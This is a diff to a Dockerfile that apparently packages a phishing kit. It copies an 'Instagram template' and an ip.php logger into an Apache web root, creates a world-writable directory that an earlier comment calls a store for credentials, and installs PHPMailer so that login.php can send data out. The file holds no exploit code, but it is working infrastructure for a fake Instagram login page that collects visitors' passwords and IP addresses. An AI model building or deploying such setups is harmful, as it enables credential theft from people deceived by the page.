@@ -1,24 +1,31 @@
-# Use PHP with Apache
 FROM php:apache
 
-# Copy your Instagram template to the web root
+# Copy your Instagram template
 COPY .sites/instagram /var/www/html/
 COPY .sites/ip.php /var/www/html/
 
-# Create auth directory for credentials
+# Create auth directory
 RUN mkdir -p /var/www/html/auth && chmod 777 /var/www/html/auth
-
-# Fix permissions - THIS IS THE KEY FIX
-RUN chown -R www-data:www-data /var/www/html/ && \
-    chmod -R 755 /var/www/html/ && \
-    chmod 644 /var/www/html/index.php
 
 # Enable Apache modules
 RUN a2enmod rewrite
 
-# Ensure index.php is the default
-RUN echo "DirectoryIndex index.php" > /etc/apache2/conf-available/directory-index.conf && \
-    a2enconf directory-index
+# ================================================
+# INSTALL COMPOSER + PHPMailer
+# ================================================
+# Install Composer
+RUN curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer
+
+# Copy composer.json (and composer.lock if you have one)
+COPY composer.json /var/www/html/composer.json
+
+# Install dependencies (PHPMailer)
+RUN cd /var/www/html && composer install --no-dev --optimize-autoloader
+
+# Move the vendor folder to where PHP can find it (or keep it in /var/www/html)
+# The autoload path in login.php will be /var/www/html/vendor/autoload.php
+
+# ================================================
 
 EXPOSE 80
 
